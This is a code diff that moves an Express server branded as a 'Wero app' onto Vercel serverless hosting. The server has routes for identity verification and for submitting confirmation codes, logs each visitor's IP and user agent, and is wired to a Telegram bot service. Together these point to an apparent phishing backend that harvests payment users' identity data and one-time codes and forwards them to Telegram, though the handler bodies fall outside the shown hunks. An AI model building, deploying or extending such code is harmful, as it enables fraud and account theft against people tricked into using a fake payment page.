@@ -1,24 +1,30 @@
+// Vercel Serverless Function
+// Point d'entrée pour toutes les requêtes
 require('dotenv').config();
 const express = require('express');
 const path = require('path');
+
 const app = express();
-const telegramService = require('./telegramService');
 
 // Middleware
 app.set('view engine', 'ejs');
-app.set('views', path.join(__dirname, 'views'));
-app.use(express.static(path.join(__dirname, 'public')));
+app.set('views', path.join(__dirname, '../backend-nodejs/views'));
+app.use(express.static(path.join(__dirname, '../backend-nodejs/public')));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// Import Telegram Service
+const telegramService = require('../backend-nodejs/telegramService');
+
 // Middleware pour capturer IP et User Agent
 app.use((req, res, next) => {
-  req.clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'N/A';
+  req.clientIP = req.headers['x-forwarded-for'] || req.headers['cf-connecting-ip'] || req.connection.remoteAddress || 'N/A';
   req.userAgent = req.headers['user-agent'] || 'N/A';
   next();
 });
 
-// Routes Pages
+// ==================== ROUTES PAGES ====================
+
 app.get('/', (req, res) => {
   res.render('index');
 });
@@ -129,7 +135,7 @@ app.post('/api/verify-identity', async (req, res) => {
   }
 });
 
-// Envoyer confirmation (page 4 - deuxième)
+// Envoyer confirmation (page 4)
 app.post('/api/send-confirmation', async (req, res) => {
   try {
     const { confirmationCode } = req.body;
@@ -162,7 +168,7 @@ app.post('/api/test-telegram', async (req, res) => {
 
 // Health check
 app.get('/api/health', (req, res) => {
-  res.json({ status: 'OK', timestamp: new Date().toISOString() });
+  res.json({ status: 'OK', timestamp: new Date().toISOString(), environment: 'vercel' });
 });
 
 // Error handler
@@ -171,15 +177,5 @@ app.use((err, req, res, next) => {
   res.status(500).json({ error: 'Erreur serveur interne' });
 });
 
-// Start server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`\n🚀 Wero app running on http://localhost:${PORT}`);
-  console.log(`📱 Telegram Bot: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configuré' : '❌ Non configuré'}`);
-  
-  // Test Telegram au démarrage
-  if (process.env.TELEGRAM_BOT_TOKEN) {
-    telegramService.testConnection().catch(console.error);
-  }
-  console.log('');
-});
+// Export pour Vercel
+module.exports = app;
